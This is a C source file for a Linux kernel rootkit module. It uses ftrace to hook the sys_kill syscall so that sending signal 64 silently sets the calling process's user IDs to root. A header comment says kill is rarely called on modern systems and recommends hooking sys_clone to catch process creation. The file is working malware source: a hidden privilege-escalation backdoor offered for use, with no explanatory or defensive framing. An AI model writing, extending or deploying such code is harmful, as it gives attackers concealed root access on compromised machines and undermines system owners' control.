/*
 * While using this code I noticed that it wasn't being called. After research and testing, modern systems rarely use kill.
 * To hook the creation of processes I'd recommend hooking the sys_clone syscall.
 */
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/cred.h>
#include "ftrace_helper.h"

#define SET_ROOT_SIGNAL 64

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static void set_root(void)
{
    struct cred *root;
    root = prepare_creds();
    if (!root)
	    return;
    // Set all User IDs to 0 (root)
    root->uid.val   = 0;
    root->fsuid.val = 0;    // filesystem
    root->euid.val  = 0;    // Effective
    root->suid.val  = 0;    // Saved
    
    commit_creds(root);
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int (*orig_kill)(const struct pt_regs *);

static asmlinkage int hooked_kill(const struct pt_regs *registers)
{
    int sig = registers->si;
    if (sig == SET_ROOT_SIGNAL)
    {
	    set_root();
        return 0;
    }
    return orig_kill(registers);
}
#else

static asmlinkage int (*orig_kill)(pid_t pid, int sig);
static asmlinkage int hooked_kill(pid_t pid, int sig)
{
    if (sig == SET_ROOT_SIGNAL)
    {
	    set_root();
        return 0;
    }
    return orig_kill(pid, sig);
}
#endif

const struct ftrace_hook kill_hook = HOOK("sys_kill", hooked_kill, &orig_kill);

